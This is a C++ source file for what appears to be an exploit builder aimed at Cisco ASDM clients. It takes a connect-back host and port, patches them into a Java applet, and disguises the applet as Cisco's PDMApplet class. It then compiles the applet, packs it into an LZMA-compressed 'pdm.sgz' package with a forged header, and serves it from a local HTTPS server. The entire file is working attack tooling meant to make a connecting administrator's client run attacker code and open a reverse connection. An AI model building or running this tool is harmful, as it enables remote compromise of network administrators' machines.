#include "popl.hpp"
#include <random>
#include <cstdlib>
#include <iostream>
#include <unistd.h>
#include <filesystem>

namespace
{
    std::string load_file(const std::string& p_file)
    {
        std::ifstream inputFile(p_file, std::ifstream::in | std::ifstream::binary);
        if (!inputFile.is_open() || !inputFile.good())
        {
            std::cerr << "Failed to ropen the provided file: " << p_file << std::endl;
            return std::string();
        }

        std::string input((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
        inputFile.close();
        return input;
    }

    void write_file(const std::string& p_output, const std::string& p_file)
    {
        std::ofstream out(p_file, std::ios::trunc);
        out.write(p_output.data(), p_output.size());
        out.close();      
    }

    void create_jar_entry(std::string& p_jars, const std::string& p_name, const std::string& p_data)
    {
        std::uint16_t name_length = p_name.size();
        std::uint32_t data_length = p_data.size();
        p_jars.append(reinterpret_cast<const char*>(&name_length), sizeof(name_length));
        p_jars.append(p_name);
        p_jars.append(reinterpret_cast<const char*>(&data_length), sizeof(data_length));
        p_jars.append(p_data.data(), p_data.size());
    }

    void findAndReplace(std::string& p_haystack, const std::string& p_needle, const std::string& p_replacement)
    {
        std::size_t pos = p_haystack.find(p_needle);
        if (pos != std::string::npos)
        {
            p_haystack.replace(pos, p_needle.size(), p_replacement);
        }
    }
}

int main(int p_argc, char** p_argv)
{
    popl::OptionParser op("Allowed options");
    auto help_option = op.add<popl::Switch>("h", "help", "produce help message");
    auto lhost_option = op.add<popl::Value<std::string>, popl::Attribute::required>("", "lhost", "The host to connect back");
    auto lport_option = op.add<popl::Value<int>, popl::Attribute::required>("", "lport", "The port to connect back to");
    auto https_port_option = op.add<popl::Value<int>>("", "https_port", "The port for the HTTP server to listen on", 443);

    try
    {
        op.parse(p_argc, p_argv);
    }
    catch (std::exception& e)
    {
        std::cout << e.what() << std::endl;
        std::cout << op << std::endl;
        return EXIT_FAILURE;
    }

    if (help_option->is_set())
    {
        std::cout << op << std::endl;
        return EXIT_SUCCESS;
    }

    // patch the user options into the payload
    std::cout << "[+] User provided a connect back target of " << lhost_option->value() << ":" << lport_option->value() << std::endl;
    std::filesystem::copy_file("../payload/PDMApplet.java", "PDMApplet.java", std::filesystem::copy_options::overwrite_existing);
    std::filesystem::copy_file("../payload/SgzApplet.java", "SgzApplet.java", std::filesystem::copy_options::overwrite_existing);
    std::string pdm(load_file("PDMApplet.java"));
    if (pdm.empty())
    {
        std::cerr << "Failed to load PDMApplet.java" << std::endl;
        return EXIT_FAILURE;
    }

    std::string port(std::to_string(lport_option->value()));
    findAndReplace(pdm, "!!!LHOST!!!", lhost_option->value());
    findAndReplace(pdm, "!!!LPORT!!!", port);
    write_file(pdm, "PDMApplet.java");

    std::cout << "[+] Compiling Payload using `javac PDMApplet.java SgzApplet.java`" << std::endl;
    system("javac PDMApplet.java SgzApplet.java");

    std::cout << "[+] Creating JAR entries" << std::endl;
    std::string jars;
    std::string payload(load_file("PDMApplet.class"));
    if (payload.empty())
    {
        std::cerr << "Failed to load PDMApplet.class. Did compilation fail?" << std::endl;
        return EXIT_FAILURE;
    }
    create_jar_entry(jars, "com/cisco/pdm/PDMApplet.class", payload);
    write_file(jars, "jars");

    std::cout << "[+] Compressing jar entries with `lzma -z jars`" << std::endl;
    system("rm jars.lzma 2>/dev/null; lzma -z jars");

    std::cout << "[+] Adding sgz wrapper" << std::endl;
    std::string compressed_jars(load_file("jars.lzma"));
    if (compressed_jars.empty())
    {
        std::cerr << "Failed to load jars.lzma. Did lzma -z fail?" << std::endl;
        return EXIT_FAILURE;
    }

    // create fingerprint header
    std::random_device randomish;
    std::uint8_t fingerprint[17] = { 0 };
    for (int i = 0; i < 16; i++)
    {
        fingerprint[i] = randomish();
    }
    fingerprint[16] = 0x67;

    // create header for jars
    std::uint8_t jar_header[5] = { 0 };
    jar_header[4] = 3;
    std::uint32_t jar_length = compressed_jars.size();
    memcpy(jar_header, &jar_length, sizeof(uint32_t));

    // create last entry header
    std::uint8_t trailer[5] = { 0xff, 0xff, 0xff, 0xff, 0x00 };

    std::cout << "[+] Flushing the pdm.sgz to disk" << std::endl;
    std::ofstream out("pdm.sgz");
    out.write((const char*)&fingerprint[0], 17);
    out.write((const char*)&jar_header[0], 5);
    out.write(compressed_jars.data(), compressed_jars.size());
    out.write((const char*)&trailer[0], 5);
    out.close();

    std::cout << "[+] Copying pdm.sgz to the http server" << std::endl;
    std::filesystem::copy_file("pdm.sgz", "../http/admin/pdm.sgz", std::filesystem::copy_options::overwrite_existing);

    std::cout << "[+] Changing working directory to ../http" << std::endl;
    chdir("../http/");

    std::stringstream port_convert;
    port_convert << https_port_option->value();

    std::cout << "[+] Starting python server on port " << port_convert.str() << std::endl;
    system(std::string("python3 ./server.py --port " + port_convert.str()).c_str());

    return EXIT_FAILURE;
}